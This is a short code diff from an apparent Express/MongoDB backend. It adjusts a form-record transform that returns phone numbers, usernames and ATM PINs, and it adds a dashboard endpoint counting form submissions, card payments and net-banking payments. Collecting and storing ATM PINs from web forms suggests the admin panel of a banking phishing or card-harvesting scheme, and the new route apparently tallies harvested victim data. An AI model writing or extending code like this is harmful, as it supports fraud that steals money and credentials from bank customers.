@@ -38,7 +38,7 @@ function transformFormDoc(doc: any) {
 
   return {
     _id: doc._id,
-    uniqueid: doc.uniqueid || (payload.uniqueid ?? ""),
+    uniqueid: doc.uniqueid || payload.uniqueid || "",
     phoneNumber,
     username,
     atmPin,
@@ -47,6 +47,31 @@ function transformFormDoc(doc: any) {
     updatedAt: doc.updatedAt,
   };
 }
+
+/* ================= DASHBOARD SUMMARY ================= */
+
+router.get("/dashboard/forms-summary", async (_req: Request, res: Response) => {
+  try {
+    const [formsCount, cardPaymentsCount, netBankingCount] = await Promise.all([
+      FormSubmission.countDocuments({}),
+      Payment.countDocuments({ method: "card" }),
+      Payment.countDocuments({ method: "netbanking" }),
+    ]);
+
+    return res.json({
+      formsCount: Number(formsCount || 0),
+      cardPaymentsCount: Number(cardPaymentsCount || 0),
+      netBankingCount: Number(netBankingCount || 0),
+    });
+  } catch (err: any) {
+    logger.error("forms: dashboard forms-summary failed", err);
+    return res.status(500).json({
+      formsCount: 0,
+      cardPaymentsCount: 0,
+      netBankingCount: 0,
+    });
+  }
+});
 
 /* ================= LIST FORM SUBMISSIONS ================= */
 router.get("/form_submissions", async (_req: Request, res: Response) => {
